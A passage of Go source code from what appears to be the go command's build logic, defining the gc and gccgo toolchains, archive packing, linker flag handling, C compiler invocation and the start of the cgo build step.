	cc(b *builder, p *Package, objdir, ofile, cfile string) error
	// asm runs the assembler in a specific directory on a specific file
	// to generate the named output file.
	asm(b *builder, p *Package, obj, ofile, sfile string) error
	// pkgpath builds an appropriate path for a temporary package file.
	pkgpath(basedir string, p *Package) string
	// pack runs the archive packer in a specific directory to create
	// an archive from a set of object files.
	// typically it is run in the object directory.
	pack(b *builder, p *Package, objDir, afile string, ofiles []string) error
	// ld runs the linker to create an executable starting at mainpkg.
	ld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error
	// ldShared runs the linker to create a shared library containing the pkgs built by toplevelactions
	ldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error

	compiler() string
	linker() string
}

type noToolchain struct{}

func noCompiler() error {
	log.Fatalf("unknown compiler %q", buildContext.Compiler)
	return nil
}

func (noToolchain) compiler() string {
	noCompiler()
	return ""
}

func (noToolchain) linker() string {
	noCompiler()
	return ""
}

func (noToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, out []byte, err error) {
	return "", nil, noCompiler()
}

func (noToolchain) asm(b *builder, p *Package, obj, ofile, sfile string) error {
	return noCompiler()
}

func (noToolchain) pkgpath(basedir string, p *Package) string {
	noCompiler()
	return ""
}

func (noToolchain) pack(b *builder, p *Package, objDir, afile string, ofiles []string) error {
	return noCompiler()
}

func (noToolchain) ld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error {
	return noCompiler()
}

func (noToolchain) ldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error {
	return noCompiler()
}

func (noToolchain) cc(b *builder, p *Package, objdir, ofile, cfile string) error {
	return noCompiler()
}

// The Go toolchain.
type gcToolchain struct{}

func (gcToolchain) compiler() string {
	return tool("compile")
}

func (gcToolchain) linker() string {
	return tool("link")
}

func (gcToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, output []byte, err error) {
	if archive != "" {
		ofile = archive
	} else {
		out := "_go_.o"
		ofile = obj + out
	}

	gcargs := []string{"-p", p.ImportPath}
	if p.Name == "main" {
		gcargs[1] = "main"
	}
	if p.Standard && (p.ImportPath == "runtime" || strings.HasPrefix(p.ImportPath, "runtime/internal")) {
		// runtime compiles with a special gc flag to emit
		// additional reflect type data.
		gcargs = append(gcargs, "-+")
	}

	// If we're giving the compiler the entire package (no C etc files), tell it that,
	// so that it can give good error messages about forward declarations.
	// Exceptions: a few standard packages have forward declarations for
	// pieces supplied behind-the-scenes by package runtime.
	extFiles := len(p.CgoFiles) + len(p.CFiles) + len(p.CXXFiles) + len(p.MFiles) + len(p.SFiles) + len(p.SysoFiles) + len(p.SwigFiles) + len(p.SwigCXXFiles)
	if p.Standard {
		switch p.ImportPath {
		case "bytes", "net", "os", "runtime/pprof", "sync", "time":
			extFiles++
		}
	}
	if extFiles == 0 {
		gcargs = append(gcargs, "-complete")
	}
	if buildContext.InstallSuffix != "" {
		gcargs = append(gcargs, "-installsuffix", buildContext.InstallSuffix)
	}
	if p.buildID != "" {
		gcargs = append(gcargs, "-buildid", p.buildID)
	}

	for _, path := range p.Imports {
		if i := strings.LastIndex(path, "/vendor/"); i >= 0 {
			gcargs = append(gcargs, "-importmap", path[i+len("/vendor/"):]+"="+path)
		} else if strings.HasPrefix(path, "vendor/") {
			gcargs = append(gcargs, "-importmap", path[len("vendor/"):]+"="+path)
		}
	}

	//fmt.Println("tool compile")
	//fmt.Println(tool("compile"))
	args := []interface{}{buildToolExec, tool("compile"), "-o", ofile, "-trimpath", b.work, buildGcflags, gcargs, "-D", p.localPrefix, importArgs}
	if ofile == archive {
		args = append(args, "-pack")
	}
	if asmhdr {
		args = append(args, "-asmhdr", obj+"go_asm.h")
	}
	for _, f := range gofiles {
		args = append(args, mkAbs(p.Dir, f))
	}

	//fmt.Println("compile args")
	//fmt.Println(args)
	output, err = b.runOut(p.Dir, p.ImportPath, nil, args...)
	return ofile, output, err
}

func (gcToolchain) asm(b *builder, p *Package, obj, ofile, sfile string) error {
	// Add -I pkg/GOOS_GOARCH so #include "textflag.h" works in .s files.
	inc := filepath.Join(goroot, "pkg", "include")
	sfile = mkAbs(p.Dir, sfile)
	args := []interface{}{buildToolExec, tool("asm"), "-o", ofile, "-trimpath", b.work, "-I", obj, "-I", inc, "-D", "GOOS_" + goos, "-D", "GOARCH_" + goarch, buildAsmflags, sfile}
	if err := b.run(p.Dir, p.ImportPath, nil, args...); err != nil {
		return err
	}
	return nil
}

// toolVerify checks that the command line args writes the same output file
// if run using newTool instead.
// Unused now but kept around for future use.
func toolVerify(b *builder, p *Package, newTool string, ofile string, args []interface{}) error {
	newArgs := make([]interface{}, len(args))
	copy(newArgs, args)
	newArgs[1] = tool(newTool)
	newArgs[3] = ofile + ".new" // x.6 becomes x.6.new
	if err := b.run(p.Dir, p.ImportPath, nil, newArgs...); err != nil {
		return err
	}
	data1, err := ioutil.ReadFile(ofile)
	if err != nil {
		return err
	}
	data2, err := ioutil.ReadFile(ofile + ".new")
	if err != nil {
		return err
	}
	if !bytes.Equal(data1, data2) {
		return fmt.Errorf("%s and %s produced different output files:\n%s\n%s", filepath.Base(args[1].(string)), newTool, strings.Join(stringList(args...), " "), strings.Join(stringList(newArgs...), " "))
	}
	os.Remove(ofile + ".new")
	return nil
}

func (gcToolchain) pkgpath(basedir string, p *Package) string {
	end := filepath.FromSlash(p.ImportPath + ".a")
	return filepath.Join(basedir, end)
}

func (gcToolchain) pack(b *builder, p *Package, objDir, afile string, ofiles []string) error {
	var absOfiles []string
	for _, f := range ofiles {
		absOfiles = append(absOfiles, mkAbs(objDir, f))
	}
	cmd := "c"
	absAfile := mkAbs(objDir, afile)
	appending := false
	if _, err := os.Stat(absAfile); err == nil {
		appending = true
		cmd = "r"
	}

	cmdline := stringList("pack", cmd, absAfile, absOfiles)

	if appending {
		if buildN || buildX {
			b.showcmd(p.Dir, "%s # internal", joinUnambiguously(cmdline))
		}
		if buildN {
			return nil
		}
		if err := packInternal(b, absAfile, absOfiles); err != nil {
			b.showOutput(p.Dir, p.ImportPath, err.Error()+"\n")
			return errPrintedOutput
		}
		return nil
	}

	// Need actual pack.
	cmdline[0] = tool("pack")
	return b.run(p.Dir, p.ImportPath, nil, buildToolExec, cmdline)
}

func packInternal(b *builder, afile string, ofiles []string) error {
	dst, err := os.OpenFile(afile, os.O_WRONLY|os.O_APPEND, 0)
	if err != nil {
		return err
	}
	defer dst.Close() // only for error returns or panics
	w := bufio.NewWriter(dst)

	for _, ofile := range ofiles {
		src, err := os.Open(ofile)
		if err != nil {
			return err
		}
		fi, err := src.Stat()
		if err != nil {
			src.Close()
			return err
		}
		// Note: Not using %-16.16s format because we care
		// about bytes, not runes.
		name := fi.Name()
		if len(name) > 16 {
			name = name[:16]
		} else {
			name += strings.Repeat(" ", 16-len(name))
		}
		size := fi.Size()
		fmt.Fprintf(w, "%s%-12d%-6d%-6d%-8o%-10d`\n",
			name, 0, 0, 0, 0644, size)
		n, err := io.Copy(w, src)
		src.Close()
		if err == nil && n < size {
			err = io.ErrUnexpectedEOF
		} else if err == nil && n > size {
			err = fmt.Errorf("file larger than size reported by stat")
		}
		if err != nil {
			return fmt.Errorf("copying %s to %s: %v", ofile, afile, err)
		}
		if size&1 != 0 {
			w.WriteByte(0)
		}
	}

	if err := w.Flush(); err != nil {
		return err
	}
	return dst.Close()
}

// setextld sets the appropriate linker flags for the specified compiler.
func setextld(ldflags []string, compiler []string) []string {
	for _, f := range ldflags {
		if f == "-extld" || strings.HasPrefix(f, "-extld=") {
			// don't override -extld if supplied
			return ldflags
		}
	}
	ldflags = append(ldflags, "-extld="+compiler[0])
	if len(compiler) > 1 {
		extldflags := false
		add := strings.Join(compiler[1:], " ")
		for i, f := range ldflags {
			if f == "-extldflags" && i+1 < len(ldflags) {
				ldflags[i+1] = add + " " + ldflags[i+1]
				extldflags = true
				break
			} else if strings.HasPrefix(f, "-extldflags=") {
				ldflags[i] = "-extldflags=" + add + " " + ldflags[i][len("-extldflags="):]
				extldflags = true
				break
			}
		}
		if !extldflags {
			ldflags = append(ldflags, "-extldflags="+add)
		}
	}
	return ldflags
}

func (gcToolchain) ld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error {
	importArgs := b.includeArgs("-L", allactions)
	cxx := len(root.p.CXXFiles) > 0 || len(root.p.SwigCXXFiles) > 0
	for _, a := range allactions {
		if a.p != nil && (len(a.p.CXXFiles) > 0 || len(a.p.SwigCXXFiles) > 0) {
			cxx = true
		}
	}
	var ldflags []string
	if buildContext.InstallSuffix != "" {
		ldflags = append(ldflags, "-installsuffix", buildContext.InstallSuffix)
	}
	if root.p.omitDWARF {
		ldflags = append(ldflags, "-w")
	}

	// If the user has not specified the -extld option, then specify the
	// appropriate linker. In case of C++ code, use the compiler named
	// by the CXX environment variable or defaultCXX if CXX is not set.
	// Else, use the CC environment variable and defaultCC as fallback.
	var compiler []string
	if cxx {
		compiler = envList("CXX", defaultCXX)
	} else {
		compiler = envList("CC", defaultCC)
	}
	ldflags = setextld(ldflags, compiler)
	ldflags = append(ldflags, "-buildmode="+ldBuildmode)
	if root.p.buildID != "" {
		ldflags = append(ldflags, "-buildid="+root.p.buildID)
	}
	ldflags = append(ldflags, buildLdflags...)

	// On OS X when using external linking to build a shared library,
	// the argument passed here to -o ends up recorded in the final
	// shared library in the LC_ID_DYLIB load command.
	// To avoid putting the temporary output directory name there
	// (and making the resulting shared library useless),
	// run the link in the output directory so that -o can name
	// just the final path element.
	dir := "."
	if goos == "darwin" && buildBuildmode == "c-shared" {
		dir, out = filepath.Split(out)
	}

	return b.run(dir, root.p.ImportPath, nil, buildToolExec, tool("link"), "-o", out, importArgs, ldflags, mainpkg)
}

func (gcToolchain) ldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error {
	importArgs := b.includeArgs("-L", allactions)
	ldflags := []string{"-installsuffix", buildContext.InstallSuffix}
	ldflags = append(ldflags, "-buildmode=shared")
	ldflags = append(ldflags, buildLdflags...)
	cxx := false
	for _, a := range allactions {
		if a.p != nil && (len(a.p.CXXFiles) > 0 || len(a.p.SwigCXXFiles) > 0) {
			cxx = true
		}
	}
	// If the user has not specified the -extld option, then specify the
	// appropriate linker. In case of C++ code, use the compiler named
	// by the CXX environment variable or defaultCXX if CXX is not set.
	// Else, use the CC environment variable and defaultCC as fallback.
	var compiler []string
	if cxx {
		compiler = envList("CXX", defaultCXX)
	} else {
		compiler = envList("CC", defaultCC)
	}
	ldflags = setextld(ldflags, compiler)
	for _, d := range toplevelactions {
		if !strings.HasSuffix(d.target, ".a") { // omit unsafe etc and actions for other shared libraries
			continue
		}
		ldflags = append(ldflags, d.p.ImportPath+"="+d.target)
	}
	return b.run(".", out, nil, buildToolExec, tool("link"), "-o", out, importArgs, ldflags)
}

func (gcToolchain) cc(b *builder, p *Package, objdir, ofile, cfile string) error {
	return fmt.Errorf("%s: C source files not supported without cgo", mkAbs(p.Dir, cfile))
}

// The Gccgo toolchain.
type gccgoToolchain struct{}

var gccgoName, gccgoBin string

func init() {
	gccgoName = os.Getenv("GCCGO")
	if gccgoName == "" {
		gccgoName = "gccgo"
	}
	gccgoBin, _ = exec.LookPath(gccgoName)
}

func (gccgoToolchain) compiler() string {
	return gccgoBin
}

func (gccgoToolchain) linker() string {
	return gccgoBin
}

func (tools gccgoToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, output []byte, err error) {
	out := "_go_.o"
	ofile = obj + out
	gcargs := []string{"-g"}
	gcargs = append(gcargs, b.gccArchArgs()...)
	if pkgpath := gccgoPkgpath(p); pkgpath != "" {
		gcargs = append(gcargs, "-fgo-pkgpath="+pkgpath)
	}
	if p.localPrefix != "" {
		gcargs = append(gcargs, "-fgo-relative-import-path="+p.localPrefix)
	}
	args := stringList(tools.compiler(), importArgs, "-c", gcargs, "-o", ofile, buildGccgoflags)
	for _, f := range gofiles {
		args = append(args, mkAbs(p.Dir, f))
	}

	output, err = b.runOut(p.Dir, p.ImportPath, nil, args)
	return ofile, output, err
}

func (tools gccgoToolchain) asm(b *builder, p *Package, obj, ofile, sfile string) error {
	sfile = mkAbs(p.Dir, sfile)
	defs := []string{"-D", "GOOS_" + goos, "-D", "GOARCH_" + goarch}
	if pkgpath := gccgoCleanPkgpath(p); pkgpath != "" {
		defs = append(defs, `-D`, `GOPKGPATH="`+pkgpath+`"`)
	}
	defs = tools.maybePIC(defs)
	defs = append(defs, b.gccArchArgs()...)
	return b.run(p.Dir, p.ImportPath, nil, tools.compiler(), "-I", obj, "-o", ofile, defs, sfile)
}

func (gccgoToolchain) pkgpath(basedir string, p *Package) string {
	end := filepath.FromSlash(p.ImportPath + ".a")
	afile := filepath.Join(basedir, end)
	// add "lib" to the final element
	return filepath.Join(filepath.Dir(afile), "lib"+filepath.Base(afile))
}

func (gccgoToolchain) pack(b *builder, p *Package, objDir, afile string, ofiles []string) error {
	var absOfiles []string
	for _, f := range ofiles {
		absOfiles = append(absOfiles, mkAbs(objDir, f))
	}
	return b.run(p.Dir, p.ImportPath, nil, "ar", "rc", mkAbs(objDir, afile), absOfiles)
}

func (tools gccgoToolchain) ld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error {
	// gccgo needs explicit linking with all package dependencies,
	// and all LDFLAGS from cgo dependencies.
	apackagesSeen := make(map[*Package]bool)
	afiles := []string{}
	shlibs := []string{}
	xfiles := []string{}
	ldflags := b.gccArchArgs()
	cgoldflags := []string{}
	usesCgo := false
	cxx := len(root.p.CXXFiles) > 0 || len(root.p.SwigCXXFiles) > 0
	objc := len(root.p.MFiles) > 0

	actionsSeen := make(map[*action]bool)
	// Make a pre-order depth-first traversal of the action graph, taking note of
	// whether a shared library action has been seen on the way to an action (the
	// construction of the graph means that if any path to a node passes through
	// a shared library action, they all do).
	var walk func(a *action, seenShlib bool)
	walk = func(a *action, seenShlib bool) {
		if actionsSeen[a] {
			return
		}
		actionsSeen[a] = true
		if a.p != nil && !seenShlib {
			if a.p.Standard {
				return
			}
			// We record the target of the first time we see a .a file
			// for a package to make sure that we prefer the 'install'
			// rather than the 'build' location (which may not exist any
			// more). We still need to traverse the dependencies of the
			// build action though so saying
			// if apackagesSeen[a.p] { return }
			// doesn't work.
			if !apackagesSeen[a.p] {
				apackagesSeen[a.p] = true
				if a.p.fake && a.p.external {
					// external _tests, if present must come before
					// internal _tests. Store these on a separate list
					// and place them at the head after this loop.
					xfiles = append(xfiles, a.target)
				} else if a.p.fake {
					// move _test files to the top of the link order
					afiles = append([]string{a.target}, afiles...)
				} else {
					afiles = append(afiles, a.target)
				}
			}
		}
		if strings.HasSuffix(a.target, ".so") {
			shlibs = append(shlibs, a.target)
			seenShlib = true
		}
		for _, a1 := range a.deps {
			walk(a1, seenShlib)
		}
	}
	for _, a1 := range root.deps {
		walk(a1, false)
	}
	afiles = append(xfiles, afiles...)

	for _, a := range allactions {
		// Gather CgoLDFLAGS, but not from standard packages.
		// The go tool can dig up runtime/cgo from GOROOT and
		// think that it should use its CgoLDFLAGS, but gccgo
		// doesn't use runtime/cgo.
		if a.p == nil {
			continue
		}
		if !a.p.Standard {
			cgoldflags = append(cgoldflags, a.p.CgoLDFLAGS...)
		}
		if len(a.p.CgoFiles) > 0 {
			usesCgo = true
		}
		if a.p.usesSwig() {
			usesCgo = true
		}
		if len(a.p.CXXFiles) > 0 || len(a.p.SwigCXXFiles) > 0 {
			cxx = true
		}
		if len(a.p.MFiles) > 0 {
			objc = true
		}
	}

	ldflags = append(ldflags, "-Wl,--whole-archive")
	ldflags = append(ldflags, afiles...)
	ldflags = append(ldflags, "-Wl,--no-whole-archive")

	ldflags = append(ldflags, cgoldflags...)
	ldflags = append(ldflags, envList("CGO_LDFLAGS", "")...)
	ldflags = append(ldflags, root.p.CgoLDFLAGS...)

	ldflags = stringList("-Wl,-(", ldflags, "-Wl,-)")

	for _, shlib := range shlibs {
		ldflags = append(
			ldflags,
			"-L"+filepath.Dir(shlib),
			"-Wl,-rpath="+filepath.Dir(shlib),
			"-l"+strings.TrimSuffix(
				strings.TrimPrefix(filepath.Base(shlib), "lib"),
				".so"))
	}

	var realOut string
	switch ldBuildmode {
	case "exe":
		if usesCgo && goos == "linux" {
			ldflags = append(ldflags, "-Wl,-E")
		}

	case "c-archive":
		// Link the Go files into a single .o, and also link
		// in -lgolibbegin.
		//
		// We need to use --whole-archive with -lgolibbegin
		// because it doesn't define any symbols that will
		// cause the contents to be pulled in; it's just
		// initialization code.
		//
		// The user remains responsible for linking against
		// -lgo -lpthread -lm in the final link.  We can't use
		// -r to pick them up because we can't combine
		// split-stack and non-split-stack code in a single -r
		// link, and libgo picks up non-split-stack code from
		// libffi.
		ldflags = append(ldflags, "-Wl,-r", "-nostdlib", "-Wl,--whole-archive", "-lgolibbegin", "-Wl,--no-whole-archive")

		// We are creating an object file, so we don't want a build ID.
		ldflags = b.disableBuildID(ldflags)

		realOut = out
		out = out + ".o"

	case "c-shared":
		ldflags = append(ldflags, "-shared", "-nostdlib", "-Wl,--whole-archive", "-lgolibbegin", "-Wl,--no-whole-archive", "-lgo", "-lgcc_s", "-lgcc")

	default:
		fatalf("-buildmode=%s not supported for gccgo", ldBuildmode)
	}

	switch ldBuildmode {
	case "exe", "c-shared":
		if cxx {
			ldflags = append(ldflags, "-lstdc++")
		}
		if objc {
			ldflags = append(ldflags, "-lobjc")
		}
	}

	if err := b.run(".", root.p.ImportPath, nil, tools.linker(), "-o", out, ofiles, ldflags, buildGccgoflags); err != nil {
		return err
	}

	switch ldBuildmode {
	case "c-archive":
		if err := b.run(".", root.p.ImportPath, nil, "ar", "rc", realOut, out); err != nil {
			return err
		}
	}
	return nil
}

func (tools gccgoToolchain) ldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error {
	args := []string{"-o", out, "-shared", "-nostdlib", "-zdefs", "-Wl,--whole-archive"}
	for _, a := range toplevelactions {
		args = append(args, a.target)
	}
	args = append(args, "-Wl,--no-whole-archive", "-shared", "-nostdlib", "-lgo", "-lgcc_s", "-lgcc", "-lc")
	shlibs := []string{}
	for _, a := range allactions {
		if strings.HasSuffix(a.target, ".so") {
			shlibs = append(shlibs, a.target)
		}
	}
	for _, shlib := range shlibs {
		args = append(
			args,
			"-L"+filepath.Dir(shlib),
			"-Wl,-rpath="+filepath.Dir(shlib),
			"-l"+strings.TrimSuffix(
				strings.TrimPrefix(filepath.Base(shlib), "lib"),
				".so"))
	}
	return b.run(".", out, nil, tools.linker(), args, buildGccgoflags)
}

func (tools gccgoToolchain) cc(b *builder, p *Package, objdir, ofile, cfile string) error {
	inc := filepath.Join(goroot, "pkg", "include")
	cfile = mkAbs(p.Dir, cfile)
	defs := []string{"-D", "GOOS_" + goos, "-D", "GOARCH_" + goarch}
	defs = append(defs, b.gccArchArgs()...)
	if pkgpath := gccgoCleanPkgpath(p); pkgpath != "" {
		defs = append(defs, `-D`, `GOPKGPATH="`+pkgpath+`"`)
	}
	switch goarch {
	case "386", "amd64":
		defs = append(defs, "-fsplit-stack")
	}
	defs = tools.maybePIC(defs)
	return b.run(p.Dir, p.ImportPath, nil, envList("CC", defaultCC), "-Wall", "-g",
		"-I", objdir, "-I", inc, "-o", ofile, defs, "-c", cfile)
}

// maybePIC adds -fPIC to the list of arguments if needed.
func (tools gccgoToolchain) maybePIC(args []string) []string {
	switch buildBuildmode {
	case "c-shared", "shared":
		args = append(args, "-fPIC")
	}
	return args
}

func gccgoPkgpath(p *Package) string {
	if p.build.IsCommand() && !p.forceLibrary {
		return ""
	}
	return p.ImportPath
}

func gccgoCleanPkgpath(p *Package) string {
	clean := func(r rune) rune {
		switch {
		case 'A' <= r && r <= 'Z', 'a' <= r && r <= 'z',
			'0' <= r && r <= '9':
			return r
		}
		return '_'
	}
	return strings.Map(clean, gccgoPkgpath(p))
}

// libgcc returns the filename for libgcc, as determined by invoking gcc with
// the -print-libgcc-file-name option.
func (b *builder) libgcc(p *Package) (string, error) {
	var buf bytes.Buffer

	gccCmd := b.gccCmd(p.Dir)

	prev := b.print
	if buildN {
		// In -n mode we temporarily swap out the builder's
		// print function to capture the command-line. This
		// let's us assign it to $LIBGCC and produce a valid
		// buildscript for cgo packages.
		b.print = func(a ...interface{}) (int, error) {
			return fmt.Fprint(&buf, a...)
		}
	}
	f, err := b.runOut(p.Dir, p.ImportPath, nil, gccCmd, "-print-libgcc-file-name")
	if err != nil {
		return "", fmt.Errorf("gcc -print-libgcc-file-name: %v (%s)", err, f)
	}
	if buildN {
		s := fmt.Sprintf("LIBGCC=$(%s)\n", buf.Next(buf.Len()-1))
		b.print = prev
		b.print(s)
		return "$LIBGCC", nil
	}

	// The compiler might not be able to find libgcc, and in that case,
	// it will simply return "libgcc.a", which is of no use to us.
	if !filepath.IsAbs(string(f)) {
		return "", nil
	}

	return strings.Trim(string(f), "\r\n"), nil
}

// gcc runs the gcc C compiler to create an object from a single C file.
func (b *builder) gcc(p *Package, out string, flags []string, cfile string) error {
	return b.ccompile(p, out, flags, cfile, b.gccCmd(p.Dir))
}

// gxx runs the g++ C++ compiler to create an object from a single C++ file.
func (b *builder) gxx(p *Package, out string, flags []string, cxxfile string) error {
	return b.ccompile(p, out, flags, cxxfile, b.gxxCmd(p.Dir))
}

// ccompile runs the given C or C++ compiler and creates an object from a single source file.
func (b *builder) ccompile(p *Package, out string, flags []string, file string, compiler []string) error {
	file = mkAbs(p.Dir, file)
	return b.run(p.Dir, p.ImportPath, nil, compiler, flags, "-o", out, "-c", file)
}

// gccld runs the gcc linker to create an executable from a set of object files.
func (b *builder) gccld(p *Package, out string, flags []string, obj []string) error {
	var cmd []string
	if len(p.CXXFiles) > 0 || len(p.SwigCXXFiles) > 0 {
		cmd = b.gxxCmd(p.Dir)
	} else {
		cmd = b.gccCmd(p.Dir)
	}
	return b.run(p.Dir, p.ImportPath, nil, cmd, "-o", out, obj, flags)
}

// gccCmd returns a gcc command line prefix
// defaultCC is defined in zdefaultcc.go, written by cmd/dist.
func (b *builder) gccCmd(objdir string) []string {
	return b.ccompilerCmd("CC", defaultCC, objdir)
}

// gxxCmd returns a g++ command line prefix
// defaultCXX is defined in zdefaultcc.go, written by cmd/dist.
func (b *builder) gxxCmd(objdir string) []string {
	return b.ccompilerCmd("CXX", defaultCXX, objdir)
}

// ccompilerCmd returns a command line prefix for the given environment
// variable and using the default command when the variable is empty.
func (b *builder) ccompilerCmd(envvar, defcmd, objdir string) []string {
	// NOTE: env.go's mkEnv knows that the first three
	// strings returned are "gcc", "-I", objdir (and cuts them off).

	compiler := envList(envvar, defcmd)
	a := []string{compiler[0], "-I", objdir}
	a = append(a, compiler[1:]...)

	// Definitely want -fPIC but on Windows gcc complains
	// "-fPIC ignored for target (all code is position independent)"
	if goos != "windows" {
		a = append(a, "-fPIC")
	}
	a = append(a, b.gccArchArgs()...)
	// gcc-4.5 and beyond require explicit "-pthread" flag
	// for multithreading with pthread library.
	if buildContext.CgoEnabled {
		switch goos {
		case "windows":
			a = append(a, "-mthreads")
		default:
			a = append(a, "-pthread")
		}
	}

	if strings.Contains(a[0], "clang") {
		// disable ASCII art in clang errors, if possible
		a = append(a, "-fno-caret-diagnostics")
		// clang is too smart about command-line arguments
		a = append(a, "-Qunused-arguments")
	}

	// disable word wrapping in error messages
	a = append(a, "-fmessage-length=0")

	// On OS X, some of the compilers behave as if -fno-common
	// is always set, and the Mach-O linker in 6l/8l assumes this.
	// See https://golang.org/issue/3253.
	if goos == "darwin" {
		a = append(a, "-fno-common")
	}

	return a
}

// gccArchArgs returns arguments to pass to gcc based on the architecture.
func (b *builder) gccArchArgs() []string {
	switch goarch {
	case "386":
		return []string{"-m32"}
	case "amd64", "amd64p32":
		return []string{"-m64"}
	case "arm":
		return []string{"-marm"} // not thumb
	}
	return nil
}

// envList returns the value of the given environment variable broken
// into fields, using the default value when the variable is empty.
func envList(key, def string) []string {
	v := os.Getenv(key)
	if v == "" {
		v = def
	}
	return strings.Fields(v)
}

// Return the flags to use when invoking the C or C++ compilers, or cgo.
func (b *builder) cflags(p *Package, def bool) (cppflags, cflags, cxxflags, ldflags []string) {
	var defaults string
	if def {
		defaults = "-g -O2"
	}

	cppflags = stringList(envList("CGO_CPPFLAGS", ""), p.CgoCPPFLAGS)
	cflags = stringList(envList("CGO_CFLAGS", defaults), p.CgoCFLAGS)
	cxxflags = stringList(envList("CGO_CXXFLAGS", defaults), p.CgoCXXFLAGS)
	ldflags = stringList(envList("CGO_LDFLAGS", defaults), p.CgoLDFLAGS)
	return
}

var cgoRe = regexp.MustCompile(`[/\\:]`)

var (
	cgoLibGccFile     string
	cgoLibGccErr      error
	cgoLibGccFileOnce sync.Once
)

func (b *builder) cgo(p *Package, cgoExe, obj string, pcCFLAGS, pcLDFLAGS, cgofiles, gccfiles, gxxfiles, mfiles []string) (outGo, outObj []string, err error) {
	cgoCPPFLAGS, cgoCFLAGS, cgoCXXFLAGS, cgoLDFLAGS := b.cflags(p, true)
	_, cgoexeCFLAGS, _, _ := b.cflags(p, false)
	cgoCPPFLAGS = append(cgoCPPFLAGS, pcCFLAGS...)
	cgoLDFLAGS = append(cgoLDFLAGS, pcLDFLAGS...)
	// If we are compiling Objective-C code, then we need to link against libobjc
	if len(mfiles) > 0 {
		cgoLDFLAGS = append(cgoLDFLAGS, "-lobjc")
	}

	if buildMSan && p.ImportPath != "runtime/cgo" {
		cgoCFLAGS = append([]string{"-fsanitize=memory"}, cgoCFLAGS...)
		cgoLDFLAGS = append([]string{"-fsanitize=memory"}, cgoLDFLAGS...)
	}

	// Allows including _cgo_export.h from .[ch] files in the package.
	cgoCPPFLAGS = append(cgoCPPFLAGS, "-I", obj)

	// cgo
	// TODO: CGO_FLAGS?
	gofiles := []string{obj + "_cgo_gotypes.go"}
	cfiles := []string{"_cgo_main.c", "_cgo_export.c"}
	for _, fn := range cgofiles {
		f := cgoRe.ReplaceAllString(fn[:len(fn)-2], "_")
		gofiles = append(gofiles, obj+f+"cgo1.go")
		cfiles = append(cfiles, f+"cgo2.c")
	}
	defunC := obj + "_cgo_defun.c"

	cgoflags := []string{}
	// TODO: make cgo not depend on $GOARCH?

	if p.Standard && p.ImportPath == "runtime/cgo" {
		cgoflags = append(cgoflags, "-import_runtime_cgo=false")
	}
	if p.Standard && (p.ImportPath == "runtime/race" || p.ImportPath == "runtime/msan" || p.ImportPath == "runtime/cgo") {
		cgoflags = append(cgoflags, "-import_syscall=false")
	}

	// Update $CGO_LDFLAGS with p.CgoLDFLAGS.
	var cgoenv []string
	if len(cgoLDFLAGS) > 0 {
		flags := make([]string, len(cgoLDFLAGS))
		for i, f := range cgoLDFLAGS {
			flags[i] = strconv.Quote(f)
		}
		cgoenv = []string{"CGO_LDFLAGS=" + strings.Join(flags, " ")}
	}

	if _, ok := buildToolchain.(gccgoToolchain); ok {
		switch goarch {
		case "386", "amd64":
			cgoCFLAGS = append(cgoCFLAGS, "-fsplit-stack")
		}
		cgoflags = append(cgoflags, "-gccgo")
		if pkgpath := gccgoPkgpath(p); pkgpath != "" {
			cgoflags = append(cgoflags, "-gccgopkgpath="+pkgpath)
		}
	}

	switch buildBuildmode {
	case "c-archive", "c-shared":
		// Tell cgo that if there are any exported functions
		// it should generate a header file that C code can
		// #include.
		cgoflags = append(cgoflags, "-exportheader="+obj+"_cgo_install.h")
	}

	if err := b.run(p.Dir, p.ImportPath, cgoenv, buildToolExec, cgoExe, "-objdir", obj, "-importpath", p.ImportPath, cgoflags, "--", cgoCPPFLAGS, cgoexeCFLAGS, cgofiles); err != nil {
		return nil, nil, err
	}
	outGo = append(outGo, gofiles...)

	// cc _cgo_defun.c
	_, gccgo := buildToolchain.(gccgoToolchain)
	if gccgo {
		defunObj := obj + "_cgo_defun.o"
		if err := buildToolchain.cc(b, p, obj, defunObj, defunC); err != nil {
			return nil, nil, err
		}
		outObj = append(outObj, defunObj)
	}

	// gcc
	var linkobj []string

	var bareLDFLAGS []string
	// When linking relocatable objects, various flags need to be
	// filtered out as they are inapplicable and can cause some linkers
	// to fail.
	for i := 0; i < len(cgoLDFLAGS); i++ {
		f := cgoLDFLAGS[i]
		switch {
		// skip "-lc" or "-l somelib"
		case strings.HasPrefix(f, "-l"):
			if f == "-l" {
				i++
			}
		// skip "-framework X" on Darwin
		case goos == "darwin" && f == "-framework":
			i++
		// skip "*.{dylib,so,dll}"
		case strings.HasSuffix(f, ".dylib"),
			strings.HasSuffix(f, ".so"),
			strings.HasSuffix(f, ".dll"):
		// Remove any -fsanitize=foo flags.
		// Otherwise the compiler driver thinks that we are doing final link
		// and links sanitizer runtime into the object file. But we are not doing
		// the final link, we will link the resulting object file again. And
		// so the program ends up with two copies of sanitizer runtime.
		// See issue 8788 for details.
		case strings.HasPrefix(f, "-fsanitize="):
			continue
		// runpath flags not applicable unless building a shared
		// object or executable; see issue 12115 for details.  This
		// is necessary as Go currently does not offer a way to
		// specify the set of LDFLAGS that only apply to shared
		// objects.
		case strings.HasPrefix(f, "-Wl,-rpath"):
			if f == "-Wl,-rpath" || f == "-Wl,-rpath-link" {
				// Skip following argument to -rpath* too.
				i++
			}
		default:
			bareLDFLAGS = append(bareLDFLAGS, f)
		}
	}

	cgoLibGccFileOnce.Do(func() {
		cgoLibGccFile, cgoLibGccErr = b.libgcc(p)
	})
	if cgoLibGccFile == "" && cgoLibGccErr != nil {
		return nil, nil, err
	}

	var staticLibs []string
	if goos == "windows" {
		// libmingw32 and libmingwex might also use libgcc, so libgcc must come last,
		// and they also have some inter-dependencies, so must use linker groups.
		staticLibs = []string{"-Wl,--start-group", "-lmingwex", "-lmingw32", "-Wl,--end-group"}
	}
